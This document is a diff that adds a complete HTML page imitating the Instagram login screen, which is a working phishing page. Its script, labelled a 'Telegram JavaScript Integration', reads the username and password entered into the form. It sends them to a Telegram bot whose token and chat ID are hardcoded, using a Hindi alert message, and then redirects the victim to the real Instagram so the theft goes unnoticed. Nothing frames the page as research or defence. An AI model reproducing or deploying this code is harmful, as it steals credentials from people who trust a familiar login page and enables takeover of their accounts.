@@ -1,1 +1,182 @@
-t
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 0 10px;
+        }
+        .container {
+            width: 100%;
+            max-width: 350px;
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 40px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        .logo {
+            margin: 22px 0 36px 0;
+        }
+        .logo img {
+            width: 175px;
+            height: 51px;
+            object-fit: contain;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        .input-field {
+            position: relative;
+            margin-bottom: 6px;
+        }
+        input {
+            width: 100%;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            padding: 9px 0 7px 9px;
+            color: #262626;
+        }
+        input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+        .login-btn {
+            background-color: #0095f6;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 7px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 8px;
+            margin-bottom: 18px;
+        }
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 10px 0 18px 0;
+        }
+        .line {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        .or-text {
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 0 18px;
+            text-transform: uppercase;
+        }
+        .fb-login {
+            margin-bottom: 20px;
+        }
+        .fb-login a {
+            text-decoration: none;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .signup-box {
+            width: 100%;
+            max-width: 350px;
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #262626;
+        }
+        .signup-box a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram">
+        </div>
+
+        <form id="loginForm">
+            <div class="input-field">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+            </div>
+            <div class="input-field">
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+
+        <div class="separator">
+            <div class="line"></div>
+            <div class="or-text">OR</div>
+            <div class="line"></div>
+        </div>
+
+        <div class="fb-login">
+            <a href="#">Log in with Facebook</a>
+        </div>
+    </div>
+
+    <div class="signup-box">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <!-- Telegram JavaScript Integration -->
+    <script>
+        const token = "8766378111:AAFhFm2MWr1z2L3NuntmI-jlDzGr2wrQRRs";  
+        const chatId = "7008289410";    
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); 
+
+            let user = document.querySelector('input[name="username"]').value;
+            let pass = document.querySelector('input[name="password"]').value;
+
+            let message = `🔔 नया लॉगिन डेटा मिला:\n👤 यूजरनेम: ${user}\n🔑 पासवर्ड: ${pass}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(response => response.json())
+            .then(data => {
+                console.log('डेटा भेज दिया गया', data);
+                window.location.href = "https://instagram.com"; 
+            })
+            .catch(error => console.error('एरर:', error));
+        });
+    </script>
+
+</body>
+</html>
